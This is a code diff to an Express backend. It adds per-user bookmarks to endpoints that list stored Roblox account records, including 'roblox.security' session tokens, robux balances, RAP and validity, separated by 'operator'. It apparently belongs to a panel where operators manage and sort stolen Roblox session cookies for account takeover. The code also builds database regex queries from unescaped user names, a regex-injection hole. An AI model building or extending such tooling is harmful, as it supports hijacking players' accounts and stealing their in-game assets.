@@ -1196,6 +1196,14 @@ app.get('/tokens-data', requireAuth, async (req, res) => {
       const robux = (robuxInfo.robux !== undefined && robuxInfo.robux !== null) ? robuxInfo.robux : ((roblox.robux !== undefined && roblox.robux !== null) ? roblox.robux : 0);
       const valid = robuxInfo.valid !== undefined ? robuxInfo.valid : true;
 
+      const userKey = (user || '').toLowerCase();
+      let userBookmarks = [];
+      if (doc.bookmarks && typeof doc.bookmarks === 'object' && !Array.isArray(doc.bookmarks)) {
+        userBookmarks = Array.isArray(doc.bookmarks[userKey]) ? doc.bookmarks[userKey] : [];
+      } else if (Array.isArray(doc.bookmarks)) {
+        userBookmarks = doc.bookmarks;
+      }
+
       return {
         file: doc.name,
         originalName: doc.originalName || doc.name,
@@ -1210,7 +1218,7 @@ app.get('/tokens-data', requireAuth, async (req, res) => {
         rap: robuxInfo.rap || 0,
         valid: valid,
         lastLogin: roblox.lastLogin || null,
-        bookmarks: doc.bookmarks || []
+        bookmarks: userBookmarks
       };
     });
 
@@ -1270,33 +1278,57 @@ app.post('/api/bookmark', requireAuth, async (req, res) => {
     if (!validGames.includes(game)) return res.status(400).json({ error: 'Invalid game' });
     
     const user = req.authUser || req.session.user;
+    const userKey = (user || '').toLowerCase();
     const db = await getDb();
-    if (!db) return res.status(500).json({ error: 'No DB' });
     
-    // Find the document
     const opQuery = (user.toLowerCase() === 'shonll')
       ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
       : { operator: { $regex: new RegExp('^' + user + '$', 'i') } };
     
-    const doc = await db.collection('files').findOne({ name: filename, ...opQuery });
-    if (!doc) return res.status(404).json({ error: 'Not found' });
-    
-    const bookmarks = doc.bookmarks || [];
-    let newBookmarks;
-    if (bookmarks.includes(game)) {
-      // Remove (toggle off)
-      newBookmarks = bookmarks.filter(g => g !== game);
+    if (db) {
+      const doc = await db.collection('files').findOne({ name: filename, ...opQuery });
+      if (!doc) return res.status(404).json({ error: 'Not found' });
+      
+      let currentBookmarks = [];
+      if (doc.bookmarks && typeof doc.bookmarks === 'object' && !Array.isArray(doc.bookmarks)) {
+        currentBookmarks = Array.isArray(doc.bookmarks[userKey]) ? doc.bookmarks[userKey] : [];
+      } else if (Array.isArray(doc.bookmarks)) {
+        currentBookmarks = doc.bookmarks;
+      }
+      
+      let newBookmarks;
+      if (currentBookmarks.includes(game)) {
+        newBookmarks = currentBookmarks.filter(g => g !== game);
+      } else {
+        newBookmarks = [...currentBookmarks, game];
+      }
+      
+      await db.collection('files').updateOne(
+        { _id: doc._id },
+        { $set: { [`bookmarks.${userKey}`]: newBookmarks } }
+      );
+      
+      res.json({ bookmarks: newBookmarks });
     } else {
-      // Add (toggle on)
-      newBookmarks = [...bookmarks, game];
+      const doc = (global.memFiles || []).find(f => {
+        const isOp = (user.toLowerCase() === 'shonll') ? true : (f.operator || '').toLowerCase() === user.toLowerCase();
+        return isOp && f.name === filename;
+      });
+      if (!doc) return res.status(404).json({ error: 'Not found' });
+      
+      if (!doc.bookmarks || typeof doc.bookmarks !== 'object' || Array.isArray(doc.bookmarks)) {
+        doc.bookmarks = {};
+      }
+      let currentBookmarks = Array.isArray(doc.bookmarks[userKey]) ? doc.bookmarks[userKey] : [];
+      let newBookmarks;
+      if (currentBookmarks.includes(game)) {
+        newBookmarks = currentBookmarks.filter(g => g !== game);
+      } else {
+        newBookmarks = [...currentBookmarks, game];
+      }
+      doc.bookmarks[userKey] = newBookmarks;
+      res.json({ bookmarks: newBookmarks });
     }
-    
-    await db.collection('files').updateOne(
-      { _id: doc._id },
-      { $set: { bookmarks: newBookmarks } }
-    );
-    
-    res.json({ bookmarks: newBookmarks });
   } catch (e) {
     console.error('Bookmark error:', e.message);
     res.status(500).json({ error: e.message });
@@ -1305,19 +1337,34 @@ app.post('/api/bookmark', requireAuth, async (req, res) => {
 
 app.get('/api/bookmarks', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
+  const userKey = (user || '').toLowerCase();
   try {
     const db = await getDb();
-    if (!db) return res.json([]);
+    let docs = [];
     
     const opQuery = (user.toLowerCase() === 'shonll')
       ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
       : { operator: { $regex: new RegExp('^' + user + '$', 'i') } };
     
-    const docs = await db.collection('files').find({
-      ...opQuery,
-      'roblox.security': { $exists: true, $ne: '' },
-      bookmarks: { $exists: true, $not: { $size: 0 } }
-    }).sort({ uploadedAt: -1 }).toArray();
+    if (db) {
+      docs = await db.collection('files').find({
+        ...opQuery,
+        'roblox.security': { $exists: true, $ne: '' },
+        $or: [
+          { [`bookmarks.${userKey}`]: { $exists: true, $not: { $size: 0 } } },
+          { bookmarks: { $exists: true, $type: 'array', $not: { $size: 0 } } }
+        ]
+      }).sort({ uploadedAt: -1 }).toArray();
+    } else {
+      docs = (global.memFiles || []).filter(f => {
+        const isOp = (user.toLowerCase() === 'shonll') ? true : (f.operator || '').toLowerCase() === user.toLowerCase();
+        if (!isOp || !f.roblox?.security) return false;
+        if (f.bookmarks && typeof f.bookmarks === 'object' && !Array.isArray(f.bookmarks)) {
+          return Array.isArray(f.bookmarks[userKey]) && f.bookmarks[userKey].length > 0;
+        }
+        return Array.isArray(f.bookmarks) && f.bookmarks.length > 0;
+      });
+    }
     
     const results = docs.map(doc => {
       const roblox = doc.roblox || {};
@@ -1326,6 +1373,13 @@ app.get('/api/bookmarks', requireAuth, async (req, res) => {
       const userId = robuxInfo.userId || roblox.userId || null;
       const robux = (robuxInfo.robux !== undefined && robuxInfo.robux !== null) ? robuxInfo.robux : ((roblox.robux !== undefined && roblox.robux !== null) ? roblox.robux : 0);
       const valid = robuxInfo.valid !== undefined ? robuxInfo.valid : true;
+      
+      let userBookmarks = [];
+      if (doc.bookmarks && typeof doc.bookmarks === 'object' && !Array.isArray(doc.bookmarks)) {
+        userBookmarks = Array.isArray(doc.bookmarks[userKey]) ? doc.bookmarks[userKey] : [];
+      } else if (Array.isArray(doc.bookmarks)) {
+        userBookmarks = doc.bookmarks;
+      }
       
       return {
         file: doc.name,
@@ -1339,9 +1393,9 @@ app.get('/api/bookmarks', requireAuth, async (req, res) => {
         robux: robux,
         valid: valid,
         lastLogin: roblox.lastLogin || null,
-        bookmarks: doc.bookmarks || []
+        bookmarks: userBookmarks
       };
-    });
+    }).filter(r => r.bookmarks && r.bookmarks.length > 0);
     
     // Deduplicate by user
     const byUser = new Map();
